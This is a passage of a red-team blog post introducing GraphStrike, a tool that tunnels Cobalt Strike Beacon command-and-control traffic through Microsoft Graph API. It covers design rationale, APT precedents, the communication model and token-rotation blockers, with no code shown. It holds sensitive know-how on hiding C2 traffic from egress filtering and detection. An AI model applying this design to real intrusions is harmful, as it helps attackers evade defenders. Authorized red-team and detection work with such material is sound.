title="Identifying Compatible Graph API Methods">Identifying Compatible Graph API Methods</a></li></ul></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-9" href="#Open_Source_Tooling_to_the_Rescue" title="Open Source Tooling to the Rescue">Open Source Tooling to the Rescue</a><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#Some_notes_on_AceLdr_and_UDRLs" title="Some notes on AceLdr and UDRLs.">Some notes on AceLdr and UDRLs.</a></li></ul></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-11" href="#Technical_Design" title="Technical Design">Technical Design</a><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#Replacing_Global_Variables" title="Replacing Global Variables">Replacing Global Variables</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#Identifying_Beacon_Communication_APIs" title="Identifying Beacon Communication API’s">Identifying Beacon Communication API’s</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-14" href="#Web_Request_Inception" title="Web Request Inception">Web Request Inception</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#Beacon_Data_and_Profile_Language" title="Beacon Data and Profile Language">Beacon Data and Profile Language</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-16" href="#Square_Pegs_and_Round_Holes" title="Square Pegs and Round Holes">Square Pegs and Round Holes</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-17" href="#Modifying_API_Call_Parameters_and_Non-GraphStrike_Beacons" title="Modifying API Call Parameters and Non-GraphStrike Beacons">Modifying API Call Parameters and Non-GraphStrike Beacons</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-18" href="#Synchronizing_the_Asynchronous" title="Synchronizing the Asynchronous">Synchronizing the Asynchronous</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-19" href="#The_GraphStrike_Server" title="The GraphStrike Server">The GraphStrike Server</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-20" href="#The_Provisioner" title="The Provisioner">The Provisioner</a></li></ul></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-21" href="#Conclusion" title="Conclusion">Conclusion</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-22" href="#Credits" title="Credits">Credits</a><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-23" href="#About_Alex_Reid_Intern" title="About Alex Reid, Intern:">About Alex Reid, Intern:</a></li></ul></li></ul></li></ul></nav></div>
<div class="rich-media-item mediaSingleView-content-wrap image-center cc-4kagsy" data-layout="center" data-width="760" data-width-type="pixel" data-node-type="mediaSingle">
<div class="cc-k6x2vs">
<div data-type="file" data-node-type="media" data-width="898" data-height="420" data-id="d06e11e4-da43-406a-9202-493b67203f59" data-collection="contentId-85164073" data-file-name="image-20240106-161600.png" data-file-size="131245" data-file-mime-type="image/png" data-alt="" data-context-id="85164073">
<div id="newFileExperienceWrapper" class="new-file-experience-wrapper cc-1r63qe5" data-testid="media-card-view">
<div class="media-file-card-view cc-1yn77bd" data-testid="media-file-card-view" data-test-status="complete" data-test-media-name="image-20240106-161600.png" data-test-progress="1"><strong data-renderer-mark="true">By: Alex Reid, Current Red Siege Intern</strong></div>
<p><img decoding="async" class="aligncenter wp-image-4568 size-full" src="https://redsiege.com/wp-content/uploads/2024/01/GRAPH-STRIKE-HEADER-IMAGE.png" alt="" width="898" height="420" srcset="https://redsiege.com/wp-content/uploads/2024/01/GRAPH-STRIKE-HEADER-IMAGE.png 898w, https://redsiege.com/wp-content/uploads/2024/01/GRAPH-STRIKE-HEADER-IMAGE-300x140.png 300w, https://redsiege.com/wp-content/uploads/2024/01/GRAPH-STRIKE-HEADER-IMAGE-768x359.png 768w" sizes="(max-width: 898px) 100vw, 898px"></p>
<h2 id="Introduction" data-renderer-start-pos="93"><span class="ez-toc-section" id="Introduction" ez-toc-data-id="#Introduction"></span>Introduction<span class="ez-toc-section-end"></span></h2>
<p data-renderer-start-pos="107">This blog post accompanies the release of an open source tool called GraphStrike which <a class="cc-tgpl01" title="https://github.com/RedSiege/GraphStrike" href="https://github.com/RedSiege/GraphStrike" data-testid="link-with-safety" data-renderer-mark="true">can be found here</a>.</p>
<p data-renderer-start-pos="107">Those familiar with my <a class="cc-tgpl01" title="https://github.com/Octoberfest7" href="https://github.com/Octoberfest7" data-testid="link-with-safety" data-renderer-mark="true">prior work</a> will know that I’m not one to skimp on the details when I publish a project and its documentation. I do this in hopes of “re-investing” in the offensive cyber community after having benefited so much myself from many of the great contributors out there. To this end, I thought it might be useful for new or aspiring offensive developers to have a peek behind the curtain when it comes to the design theory and development process of my latest public tool, GraphStrike. This is the longest blog post I’ve written by a country mile; abandon all hope, ye who enter here.</p>
<p>&nbsp;</p>
<h2 id="It-All-Starts-with-an-Idea" data-renderer-start-pos="817"><span class="ez-toc-section" id="It_All_Starts_with_an_Idea" ez-toc-data-id="#It_All_Starts_with_an_Idea"></span>It All Starts with an Idea<span class="ez-toc-section-end"></span></h2>
<p data-renderer-start-pos="845">Most of my projects have stemmed from a tweet I saw or a random thought I had. In this case, the story starts a year and a half ago when I happened to find Bobby Cooke’s <a class="cc-tgpl01" title="https://github.com/boku7/azureOutlookC2" href="https://github.com/boku7/azureOutlookC2" data-testid="link-with-safety" data-renderer-mark="true">Azure Outlook C2</a> project, which uses <a class="cc-tgpl01" title="https://learn.microsoft.com/en-us/graph/use-the-api" href="https://learn.microsoft.com/en-us/graph/use-the-api" data-testid="link-with-safety" data-renderer-mark="true">Microsoft Graph API</a> for C2 by editing Microsoft Outlook email drafts. Graph API provides methods for accessing and manipulating data within the Microsoft ecosystem, and is utilized by sending requests to graph.microsoft.com. This includes things like Microsoft Teams messages, SharePoint and OneDrive files, Outlook emails, as well as Azure data regarding users, groups, and applications. Also, as a heavy Cobalt Strike user, I decided it would be really cool if I could marry the two concepts and find a way to use Graph API with Cobalt Strike Beacons.</p>
<p>&nbsp;</p>
<h2 id="But-Is-It-Worth-Pursuing?" data-renderer-start-pos="1607"><span class="ez-toc-section" id="But_Is_It_Worth_Pursuing" ez-toc-data-id="#But_Is_It_Worth_Pursuing"></span>But Is It Worth Pursuing?<span class="ez-toc-section-end"></span></h2>
<p data-renderer-start-pos="1634">At this juncture a couple of important questions need to be asked:</p>
<p data-renderer-start-pos="1702">The first is, “while it would be super cool to use Beacon over Graph API, would this capability:</p>
<div class="fabric-editor-block-mark fabric-editor-indentation-mark" data-level="1">
<p data-renderer-start-pos="1800">A. Offer an appreciable tradecraft advantage over other less complicated methods, or</p>
</div>
<div class="fabric-editor-block-mark fabric-editor-indentation-mark" data-level="1">
<p data-renderer-start-pos="1886">B. Be uniquely representative of a threat actor?”</p>
</div>
<p data-renderer-start-pos="1937">The second is, “does a tool already exist that does what I am proposing, and if so would my tool bring something meaningfully different to the table?”</p>
<p data-renderer-start-pos="2089">Starting with the first question, does this present an appreciable improvement in tradecraft and/or is it uniquely representative of a threat actor?</p>
<p data-renderer-start-pos="2239">When I first dug into this concept I greenlit it on the basis of the tradecraft advantage it provides alone. <span id="e2bffa1a-3bb7-4dcf-bdf2-1db2b6299fb3" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="e2bffa1a-3bb7-4dcf-bdf2-1db2b6299fb3">Being able to route C2 traffic to a microsoft.com domain provides huge advantages when it comes to network egress filtering and detection. In light of threat intel that has been released in the intervening time, the project actually hits both wickets. Several different malware families attributed to named APT’s have been observed using Graph API for C2:</span></p>
<ol class="ak-ol" start="1" data-indent-level="1">
<li>
<p data-renderer-start-pos="2708"><a class="cc-tgpl01" title="https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/" href="https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/" data-testid="link-with-safety" data-renderer-mark="true">BLUELIGHT – APT37/InkySquid/ScarCruft</a></p>
</li>
<li>
<p data-renderer-start-pos="2751"><a class="cc-tgpl01" title="https://malpedia.caad.fkie.fraunhofer.de/details/win.graphite" href="https://malpedia.caad.fkie.fraunhofer.de/details/win.graphite" data-testid="link-with-safety" data-renderer-mark="true">Graphite – APT28/Fancy Bear</a></p>
</li>
<li>
<p data-renderer-start-pos="2784"><a class="cc-tgpl01" title="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/flea-backdoor-microsoft-graph-apt15" href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/flea-backdoor-microsoft-graph-apt15" data-testid="link-with-safety" data-renderer-mark="true">Graphican – APT15/Nickel/The Flea</a></p>
</li>
<li>
<p data-renderer-start-pos="2823"><a class="cc-tgpl01" title="https://www.elastic.co/security-labs/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry" href="https://www.elastic.co/security-labs/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry" data-testid="link-with-safety" data-renderer-mark="true">SiestaGraph – UNKNOWN</a></p>
</li>
</ol>
<p data-renderer-start-pos="2850">As red teamers we are in the business of, and need to be very concerned with, providing threat representative effects during operations. Of course there is a reason that they are called ‘Advanced Persistent Threats’; many (but not all, 2023 still saw lots of ‘whoami.exe’ in real breaches) of the tools and techniques used by these groups are proprietary, for which detection capabilities are not nearly as available or mature as they are for things like Cobalt Strike or any of the other readily used C2’s. This can make it difficult for red teams to replicate these techniques, and deprives defenders of a chance to observe and develop signatures for this kind of activity. Any tool that stands to make advanced techniques more available to authorized red teamers is a huge win.</p>
<p data-renderer-start-pos="3632">Pivoting to the second question, does a tool already exist that does what I am proposing, and if so would my tool bring something meaningfully different to the table”</p>
<p data-renderer-start-pos="3800">While there is definitely value to be had in porting existing tooling to different languages or formats, the projects that get me really excited are the ones where I would be creating something tangibly new or unique.</p>
<p data-renderer-start-pos="4019">A year and a half ago I kind of missed the forest for the trees. I honed in on Microsoft Teams as the medium I wanted to use for C2 traffic and lost sight of the underlying Graph API part. I couldn’t find any public projects using Teams for Cobalt Strike C2, but when considering Graph API at large, WithSecure has long had their <a class="cc-tgpl01" title="https://github.com/WithSecureLabs/C3" href="https://github.com/WithSecureLabs/C3" data-testid="link-with-safety" data-renderer-mark="true">C3 project</a> which includes an option to use OneDrive files for Cobalt Strike C2. At the end of the day, whether it is a Teams message or a OneDrive file, it’s all being done with Graph API. That being said, just because something has been done before doesn’t mean there isn’t room on the stage for other tools that offer meaningful improvements.</p>
<p data-renderer-start-pos="4696">Ultimately, my first swing at this concept took the form of a to-spec Cobalt Strike <a class="cc-tgpl01" title="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure_external-c2.htm" href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure_external-c2.htm" data-testid="link-with-safety" data-renderer-mark="true">External C2</a> that used Graph API to send Beacon traffic via Teams messages. I never released it publicly, but did <a class="cc-tgpl01" title="https://github.com/Octoberfest7/Presentations/blob/main/TradecraftCON_2022/Teams_CobaltStrike_External_C2.pdf" href="https://github.com/Octoberfest7/Presentations/blob/main/TradecraftCON_2022/Teams_CobaltStrike_External_C2.pdf" data-testid="link-with-safety" data-renderer-mark="true">present it at a conference</a>. It was a fun project but also proved to be very complicated to design and maintain, doubly so because it involved writing a custom implant in position-independent C to communicate between the Cobalt Strike SMB Beacon and Graph API.</p>
<p data-renderer-start-pos="5156">This brings us to something that cannot be overstated and one of the chief reason why I revisited this idea later: <strong data-renderer-mark="true">with offensive tooling, there is a big difference between something that technically “works”, and something that is reliable, repeatable, and easily deployable</strong>. My earlier project was the former; GraphStrike seeks to be the latter, alleviating as many of the headaches and challenges surrounding setup and deployment of a capability like this as possible.</p>
<p data-renderer-start-pos="5629">From an architectural standpoint, the meaningful difference between my first attempt at this concept and the second is that rather than following the External C2 specification (which uses a custom implant, SMB Beacon, and presents a fairly high barrier for entry), GraphStrike provides the ability to use Graph API through HTTPS Beacons. This design choice removes the need for an entire separate implant that must be developed, maintained, and deployed alongside an SMB Beacon on target.</p>
<p>&nbsp;</p>
<h2 id="Initial-Research" data-renderer-start-pos="6120"><span class="ez-toc-section" id="Initial_Research" ez-toc-data-id="#Initial_Research"></span>Initial Research<span class="ez-toc-section-end"></span></h2>
<p data-renderer-start-pos="6138">It is at this point that we should take a moment to better understand Graph API and how we will be trying to use it. Using Graph API requires that you have a Microsoft Azure tenant, and that you register a new Azure app within it. Azure apps can be assigned many different <a class="cc-tgpl01" title="https://learn.microsoft.com/en-us/graph/permissions-reference" href="https://learn.microsoft.com/en-us/graph/permissions-reference" data-testid="link-with-safety" data-renderer-mark="true">API permissions</a> which are required in different combinations in order to use the various methods available within Graph API. For example, the <a class="cc-tgpl01" title="https://learn.microsoft.com/en-us/graph/api/driveitem-get?view=graph-rest-1.0&amp;tabs=http" href="https://learn.microsoft.com/en-us/graph/api/driveitem-get?view=graph-rest-1.0&amp;tabs=http" data-testid="link-with-safety" data-renderer-mark="true">get driveItem</a> method requires the following permissions depending on the ‘Permission Type’<span id="d3847f59-b2d6-4e14-9971-07e51407744c" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="d3847f59-b2d6-4e14-9971-07e51407744c">:</span></p>
<div class="pm-table-container with-shadow-observer" data-layout="custom">
<div class="pm-table-wrapper">
<table data-testid="renderer-table" data-number-column="false" data-table-width="760">
<colgroup>
<col>
<col>
<col></colgroup>
<tbody>
<tr>
<th class="ak-renderer-tableHeader-sortable-column__wrapper" colspan="1" rowspan="1" data-colwidth="151" aria-sort="none">
<div class="ak-renderer-tableHeader-sortable-column">
<p data-renderer-start-pos="6649"><strong data-renderer-mark="true">Permission type</strong></p>
<figure class="ak-renderer-tableHeader-sorting-icon__wrapper ak-renderer-tableHeader-sorting-icon__no-order">
<div role="presentation">
<div class="ak-renderer-tableHeader-sorting-icon cc-gls7uu" tabindex="0" role="button" aria-label="No sort applied to the column" aria-disabled="false">
<div class="sorting-icon-svg__no_order ak-renderer-tableHeader-sorting-icon-inactive cc-37qivc">
<div class="cc-1h55k8m"></div>
</div>
</div>
</div>
</figure>
</div>
</th>
<th class="ak-renderer-tableHeader-sortable-column__wrapper" colspan="1" rowspan="1" data-colwidth="233" aria-sort="none">
<div class="ak-renderer-tableHeader-sortable-column">
<p data-renderer-start-pos="6668"><strong data-renderer-mark="true">Least privileged permissions</strong></p>
<figure class="ak-renderer-tableHeader-sorting-icon__wrapper ak-renderer-tableHeader-sorting-icon__no-order">
<div role="presentation">
<div class="ak-renderer-tableHeader-sorting-icon cc-gls7uu" tabindex="0" role="button" aria-label="No sort applied to the column" aria-disabled="false">
<div class="sorting-icon-svg__no_order ak-renderer-tableHeader-sorting-icon-inactive cc-37qivc">
<div class="cc-1h55k8m"></div>
</div>
</div>
</div>
</figure>
</div>
</th>
<th class="ak-renderer-tableHeader-sortable-column__wrapper" colspan="1" rowspan="1" data-colwidth="375" aria-sort="none">
<div class="ak-renderer-tableHeader-sortable-column">
<p data-renderer-start-pos="6700"><strong data-renderer-mark="true">Higher privileged permissions</strong></p>
<figure class="ak-renderer-tableHeader-sorting-icon__wrapper ak-renderer-tableHeader-sorting-icon__no-order">
<div role="presentation">
<div class="ak-renderer-tableHeader-sorting-icon cc-gls7uu" tabindex="0" role="button" aria-label="No sort applied to the column" aria-disabled="false">
<div class="sorting-icon-svg__no_order ak-renderer-tableHeader-sorting-icon-inactive cc-37qivc">
<div class="cc-1h55k8m"></div>
</div>
</div>
</div>
</figure>
</div>
</th>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="151">
<p data-renderer-start-pos="6735">Delegated (work or school account)</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="233">
<p data-renderer-start-pos="6773">Files.Read</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="375">
<p data-renderer-start-pos="6787">Files.ReadWrite, Files.Read.All, Files.ReadWrite.All, Group.Read.All, Group.ReadWrite.All, Sites.Read.All, Sites.ReadWrite.All</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="151">
<p data-renderer-start-pos="6919">Delegated (personal Microsoft account)</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="233">
<p data-renderer-start-pos="6961">Files.Read</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="375">
<p data-renderer-start-pos="6975">Files.ReadWrite, Files.Read.All, Files.ReadWrite.All</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="151">
<p data-renderer-start-pos="7033">Application</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="233">
<p data-renderer-start-pos="7048">Files.Read.All</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="375">
<p data-renderer-start-pos="7066">Files.ReadWrite.All, Group.Read.All, Group.ReadWrite.All, Sites.Read.All, Sites.ReadWrite.All</p>
</td>
</tr>
</tbody>
</table>
<div class="sentinel-right"></div>
</div>
</div>
<p data-renderer-start-pos="7164">Delegated permissions are used in workflows where users are able to sign into an app and use its assigned permissions to make requests on behalf of the user. For this project we can keep it simple and just use ‘Application’ permissions, where the app itself is the ‘user’ that performs all of the actions in question. To that end, if we want to use the ‘get driveItem’ method within Graph, we need to create an app and assign it at LEAST the ‘Files.Read.All’ permission.</p>
<p data-renderer-start-pos="7637">After an app has been created it must be assigned a client secret. This is in effect the app’s password, and will be used to retrieve access tokens which are required to actually use any of the Graph API methods. These access tokens have a lifetime of 1 hour, after which the client secret must be reused in order to fetch a new valid access token.</p>
<p data-renderer-start-pos="7987">It is also worth exploring what the communications model for C2 using Graph API might look like. Using any third party service, Graph API or otherwise, for C2 introduces added complexity. For reference, consider the two images below whose quality are upsettingly unrepresentative of how long I spent in Paint 3D making them:</p>
<p>&nbsp;</p>
<div style="width: 800px" class="wp-caption aligncenter"><img decoding="async" class="" src="https://redsiege.com/wp-content/uploads/2024/01/01.-Graph-Strike.png" alt="Normal Cobalt Strike HTTPS Communication Model" width="790" height="637"><p class="wp-caption-text">Normal Cobalt Strike HTTPS Communication Model</p></div>
<div style="width: 847px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" class="" src="https://redsiege.com/wp-content/uploads/2024/01/02.-Graph-Strike.png" alt="GraphStrike HTTPS Communication Model" width="837" height="486"><p class="wp-caption-text">GraphStrike HTTPS Communication Model</p></div>
<div class="rich-media-item mediaSingleView-content-wrap image-center cc-4kagsy" data-layout="center" data-width="760" data-width-type="pixel" data-node-type="mediaSingle">
<div class="cc-19z3uht">
<div data-type="file" data-node-type="media" data-width="1648" data-height="957" data-id="3444ca2b-ac91-4648-81da-69a27d730c79" data-collection="contentId-85164073" data-file-name="image-20240111-193027.png" data-file-size="131773" data-file-mime-type="image/png" data-alt="" data-context-id="85164073">
<div id="newFileExperienceWrapper" class="new-file-experience-wrapper cc-1cekve9" data-testid="media-card-view">
<div class="media-file-card-view cc-1yn77bd" data-testid="media-file-card-view" data-test-status="complete" data-test-media-name="image-20240111-193027.png" data-test-progress="1"></div>
</div>
</div>
</div>
<div class="cc-m15eub" data-media-caption="true" data-testid="media-caption" data-renderer-start-pos="8366"></div>
</div>
<p data-renderer-start-pos="8406">The top image shows how normal Cobalt Strike (and most any other C2 for that matter) HTTPS traffic is communicated. Beacon calls out to a IP or domain specified in the Cobalt Strike listener, which then routes the GET and POST requests back to the Cobalt Strike Team Server (TS). You ARE using a redirector and not hosting your TS publicly right? The TS responds to the request, which is then routed back through the redirector to Beacon. Easy peasy.</p>
<p data-renderer-start-pos="8859">The GraphStrike communications model is more complex. Beacon traffic no longer reaches all the way through to the TS, but instead stops at Microsoft servers. From Beacon’s perspective, Graph API server responses are the TS replying to Beacon’s http-get and http-post requests. Similarly on the TS side, we need to now reach out to Microsoft servers in order to upload new TS tasking and to fetch Beacon output. This requirement is fulfilled by a Python3 server, referred to hereafter as the GraphStrike server. This server makes HTTPS GET and POST requests to both Microsoft servers as well as the TS, serving as a bridge to manipulate and transform Cobalt Strike data as required in order to provide functionality and compatibility with Graph API.</p>
<p data-renderer-start-pos="9609">Sadly what normally takes one HTTPS transaction now requires three, and as a fun follow on effect we are now dealing with an asynchronous connection; when a command is issued by the TS, it must first be uploaded to Microsoft servers where it will then be found by Beacon at some point in the future. Similarly when Beacon issues a http-post to send tasking output to the TS, it is uploaded to Microsoft servers where it must later be retrieved by the GraphStrike server. This additional latency between when tasking is retrieved from the TS and when Beacon actually acts on it is unfortunately just the nature of async C2 via third party services.</p>
<p>&nbsp;</p>
<h2 id="Assessing-Blockers-and-Determining-Viability" data-renderer-start-pos="10258"><span class="ez-toc-section" id="Assessing_Blockers_and_Determining_Viability" ez-toc-data-id="#Assessing_Blockers_and_Determining_Viability"></span>Assessing Blockers and Determining Viability<span class="ez-toc-section-end"></span></h2>
<p data-renderer-start-pos="10304">Just because an idea is worth pursuing doesn’t mean that it will make it to maturity. After more than one occasion where I poured tens of hours into an idea only to later encounter a project-ending blocker, I have made it a point to try and map out the critical details of a project and ensure I can envision a solution that works before I spend much time doing any actual coding. This brings with it a ton of Google searching and documentation reading as I try to piece it together. I am a huge fan of whiteboards (or MS Paint in a pinch) to visualize a project and all of its moving pieces, and on more than one occasion have had someone send me this meme after seeing mine:</p>
<div class="rich-media-item mediaSingleView-content-wrap image-center cc-9f6gbe" data-layout="center" data-width="540" data-width-type="pixel" data-node-type="mediaSingle">
<div class="cc-nw16oy">
<div data-type="file" data-node-type="media" data-width="540" data-height="405" data-id="3a92cedb-502e-4616-b539-eca2575bc9a4" data-collection="contentId-85164073" data-file-name="image-20240107-012915.png" data-file-size="522363" data-file-mime-type="image/png" data-alt="" data-context-id="85164073"></div>
</div>
<div class="cc-m15eub" data-media-caption="true" data-testid="media-caption" data-renderer-start-pos="10984">
<div id="attachment_4607" style="width: 338px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-4607" class="wp-image-4607" title="https://knowyourmeme.com/photos/2546187-pepe-silvia" src="https://redsiege.com/wp-content/uploads/2024/01/03.-Graph-Strike-300x225.png" alt="https://knowyourmeme.com/photos/2546187-pepe-silvia" width="328" height="246" srcset="https://redsiege.com/wp-content/uploads/2024/01/03.-Graph-Strike-300x225.png 300w, https://redsiege.com/wp-content/uploads/2024/01/03.-Graph-Strike.png 540w" sizes="(max-width: 328px) 100vw, 328px"><p id="caption-attachment-4607" class="wp-caption-text">https://knowyourmeme.com/photos/2546187-pepe-silvia</p></div>
</div>
</div>
<p data-renderer-start-pos="11042">Having learned a bit more about Graph API and C2 via third party services, I identified several critical blockers that needed to be addressed before the project could be considered viable:</p>
<ol class="ak-ol" start="1" data-indent-level="1">
<li>
<p data-renderer-start-pos="11234">Graph API requires an access token be used with all requests, and this token expires hourly. Cobalt Strike Beacons do not support changes to their request headers during runtime.</p>
</li>
<li>
<p data-renderer-start-pos="11416">Fetching a new access token requires making a web request to a different domain (login.microsoft.com instead of graph.microsoft.com). While Cobalt Strike does support specifying multiple domains to be used by a listener (and in 4.9 even supports per-domain customization of traffic) it does not offer the functionality to ‘store’ a value retrieved by a request for later use.</p>
</li>
<li>
<p data-renderer-start-pos="11795">Some combination of Graph API calls must be identified that are compatible with Beacon’s http-get and http-post cycles. Beacon normally connects to the TS to retrieve tasking and to send output; now it needs to retrieve tasking from some Microsoft data storage mechanism accessible via Graph API and to upload output via a similar method as well.</p>
</li>
</ol>
<p data-renderer-start-pos="12147">Bottom line, if I can’t identify means of addressing each and every one, the project is dead before it even really starts.</p>
<p>&nbsp;</p>
<h4 id="Rotating-Access-Tokens" data-renderer-start-pos="12271"><span class="ez-toc-section" id="Rotating_Access_Tokens" ez-toc-data-id="#Rotating_Access_Tokens"></span>Rotating Access Tokens<span class="ez-toc-section-end"></span></h4>
<p data-renderer-start-pos="12295">The first make-or-break challenge to tackle concerns the Microsoft access tokens that are required to use Graph API. As mentioned these tokens expire hourly, at which point a new one must be fetched by connecting to login.microsoft.com.</p>
<p data-renderer-start-pos="12534">In thinking about how to address this, I first thought about creating an Aggressor script integration that would fetch an access token and then patch it into a Beacon when one is generated through the Cobalt Strike client. This would provide at least the initial access token required for Beacon to communicate with Graph API. For retrieving all subsequent access tokens, I envisioned using a <a class="cc-tgpl01" title="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm#:~:text=A%20Beacon%20Object%20File%20(BOF,and%20use%20internal%20Beacon%20APIs." href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm#:~:text=A%20Beacon%20Object%20File%20(BOF,and%20use%20internal%20Beacon%20APIs." data-testid="link-with-safety" data-renderer-mark="true">BOF</a> to locate the initial access token within the Beacon processes memory and replace it with a new one sent from the TS on a regular interval.</p>
<p data-renderer-start-pos="13073">This approach presents several problems. First and foremost, retrieving and patching an initial access token into Beacon when it is generated puts a timer on how long that Beacon is viable for; imagine a scenario where you host a payload and send out a phishing email, but 6 hours pass before the victim downloads and executes your Beacon. Given that the tokens expire after one hour, Beacon would be unable to use Graph API. Ignoring that problem, trying to locate the old access token within Beacon’s memory and patch in a new one that may differ in length isn’t an idea I viewed as particularly attractive or viable either.</p>
<p>&nbsp;</p>
<h4 id="Requests-to-Multiple-Domains" data-renderer-start-pos="13701"><span class="ez-toc-section" id="Requests_to_Multiple_Domains" ez-toc-data-id="#Requests_to_Multiple_Domains"></span>Requests to Multiple Domains<span class="ez-toc-section-end"></span></h4>
<p data-renderer-start-pos="13731">Updating Beacon’s request headers to include a new access token as time goes on is one piece of the puzzle, but actually retrieving the new access tokens is another entirely. With the issues discussed above in mind, getting Beacon to fetch access tokens itself really seemed like the smart direction to go. This would involve Beacon making HTTPS requests to login.microsoft.com in order to retrieve new access tokens, as well as HTTPS requests to graph.microsoft.com for actual C2 communications.</p>
<p data-renderer-start-pos="14229">As briefly mentioned earlier Cobalt Strike does support multiple hosts for a listener; what’s more, it now also supports multiple <a class="cc-tgpl01" title="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_http-host-profiles.htm" href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_http-host-profiles.htm" data-testid="link-with-safety" data-renderer-mark="true">HTTP Host Profiles</a>, or per-hostname request customization within the malleable profile. Using these capabilities, I could define separate host profiles for login.microsoft.com and graph.microsoft.com which would satisfy the requirement for using different headers, parameters, and URI’s depending on the host that Beacon calls out to.</p>
<p data-renderer-start-pos="14696">This sounds promising, but closer scrutiny reveals additional problems. For instance, Cobalt Strike listeners only support basic host rotation strategies. There is no mechanism wherein Beacon can be instructed to call login.microsoft.com in certain instances and graph.microsoft.com in others. Furthermore even if there was, Beacon doesn’t support storing a value returned by the server for later use, and it would try to parse the response containing the new access token as if it were a message from the TS. It doesn’t appear there is any straight forward way to address this problem.</p>
<p>&nbsp;</p>
<h4 id="Identifying-Compatible-Graph-API-Methods" data-renderer-start-pos="15285"><span class="ez-toc-section" id="Identifying_Compatible_Graph_API_Methods" ez-toc-data-id="#Identifying_Compatible_Graph_API_Methods"></span>Identifying Compatible Graph API Methods<span class="ez-toc-section-end"></span></h4>
<p data-renderer-start-pos="15327">There are hundreds of different Graph API methods, ranging from those that create new calendar events to ones used to retrieve security logs. In assessing which methods might be a good fit for C2 purposes, it is important to consider the volume of data that might be transmitted in various situations. Most commands that are issued in Cobalt Strike are relatively small, with things like ‘ps’ or ‘ls’ sending something in the neighborhood of 48 bytes to Beacon when it checks in for tasking. Other scenarios like trying to run tooling through Beacon might involved transmitting several MB worth of data during a single check-in, so it is vital that whichever Graph API methods we select support the entire range of usage scenarios.</p>
<p data-renderer-start-pos="16061">As an example, in the ‘Personal Contacts’ section of Graph API there is a method to <a class="cc-tgpl01" title="https://learn.microsoft.com/en-us/graph/api/user-post-contacts?view=graph-rest-1.0&amp;tabs=http" href="https://learn.microsoft.com/en-us/graph/api/user-post-contacts?view=graph-rest-1.0&amp;tabs=http" data-testid="link-with-safety" data-renderer-mark="true">create a new contact</a>; to determine the viability of using contacts for data transmission, we need to look at what values are contained within a contact structure. Helpfully, the Graph API documentation includes examples of each method’s usage, where we can get an idea of what kind of data is stored in a given object:</p>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
